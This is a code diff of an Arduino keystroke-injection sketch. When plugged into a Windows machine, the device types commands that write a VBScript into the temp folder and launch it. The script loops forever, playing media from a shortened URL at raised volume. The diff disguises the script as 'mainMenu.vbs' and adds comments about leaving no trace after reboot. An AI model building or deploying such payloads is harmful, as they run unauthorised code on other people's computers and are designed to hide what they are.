@@ -36,22 +36,28 @@ void setup()
 
   delay(200);
 
-  Keyboard.print("cd %tmp% && copy con rickyou.vbs");
+  // Go to the temp directory so when is rebooted there's no trace
+  // Open a script file
+  Keyboard.print("cd %tmp% && copy con mainMenu.vbs");
 
   typeKey(KEY_RETURN);
 
   Keyboard.print("While true");
 
   typeKey(KEY_RETURN);
-
+  // Reserves memory for the object oPlayer
   Keyboard.print("Dim oPlayer");
 
   typeKey(KEY_RETURN);
 
+  // Uses windows media player
+  // More info: Info https://learn.microsoft.com/en-us/windows/win32/wmp/player-object
   Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");
 
   typeKey(KEY_RETURN);
 
+  // Gets the media from URL 
+  // more info: https://learn.microsoft.com/en-us/windows/win32/wmp/player-url
   Keyboard.print("oPlayer.URL = \"https://tinyurl.com/mainMenu13254654\"");
 
   typeKey(KEY_RETURN);
@@ -118,7 +124,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("start rickyou.vbs && volup.vbs");
+  Keyboard.print("start mainMenu.vbs && volup.vbs");
 
   typeKey(KEY_RETURN);
 
